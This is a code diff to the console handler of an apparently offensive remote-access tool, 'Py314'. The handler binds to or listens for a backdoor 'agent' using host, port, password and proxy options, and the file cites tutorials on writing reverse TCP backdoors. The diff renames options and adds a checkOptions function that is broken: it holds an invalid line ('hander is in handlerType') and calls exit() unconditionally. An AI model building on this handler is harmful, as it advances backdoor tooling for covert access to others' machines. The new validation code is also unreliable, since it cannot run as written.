@@ -8,9 +8,9 @@ import logging
 import hashlib
 import threading
 from cmd import Cmd
+from netaddr import IPAddress
 from core import channels
 from os import system, path
-from netaddr import ip
 from termcolor import colored
 from prettytable import PrettyTable
 
@@ -161,11 +161,10 @@ class Prompt(Cmd):
 
     # Define some default values for options
     optionsDict = {
-        'rhost': '10.0.10.10',
-        'rport': 1234,
+        'host': '10.0.10.10',
+        'port': 1234,
         'password': 'Py314!',
         'proxy': '', 
-        'verbose': False,
         'type': 'reverse_listener'
     }
 
@@ -287,21 +286,17 @@ class Prompt(Cmd):
 
 # < -------------------------- Handler OPTIONS -------------------------- >
 
-    def set_rhost(self):
-        """Define remote IP of Py314 agent to bind"""
+    def set_host(self):
+        """Define IP address to use (to bind agent or to create a listener)"""
 
-    def set_rport(self):
-        """Define remote port of Py314 agent to bind"""
+    def set_port(self):
+        """Define a port to use (to bind agent or to create a listener)"""
 
     def set_password(self):
         """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""
 
     def set_proxy(self):
         """Define a proxy (socks4, socks5 and HTTP), which be use to bind Py314 agent : <type>://<ip>:<port>"""
-
-    def set_verbose(self):
-        """Enable verbosity of bind_agent handler (default : False)"""
-        self.optionsDict['verbose'] = arg
 
     def set_type(self):
         """Define type of handler : bind_agent/reverse_listener"""
@@ -329,11 +324,15 @@ def startModule():
 
 def ConnectAgent(dictionnary):
 
-    host = dictionnary['rhost']
-    port = int(dictionnary['rport'])
+
+    checkOptions(dictionnary)
+
+
+
+    host = dictionnary['host']
+    port = int(dictionnary['port'])
     password = dictionnary['password']
     proxy = dictionnary['proxy']
-    verbose = dictionnary['verbose']
     agentType = dictionnary['type']
 
     ciperPassword = hashlib.sha512(password.encode()).hexdigest()
@@ -430,6 +429,33 @@ def checkAgent(channel, objet):
             break
         
         time.sleep(3)
+
+
+def checkOptions(dictionnary):
+    """Function to check options before trying to established a connection with remote agent"""
+
+
+    logger.debug(f"Dictionnary items : {dictionnary}")
+    handlerType = ['bind_agent', 'reverse_listener']
+
+    try:
+        ip = IPAddress(dictionnary['host'])
+        port = int(dictionnary['port'])
+        handler = dictionnary['type']
+
+        hander is in handlerType
+
+
+
+    except Exception as error:
+        logger.warning(str(error).capitalize())
+    
+
+    exit()
+
+
+
+
 
     # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
     # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
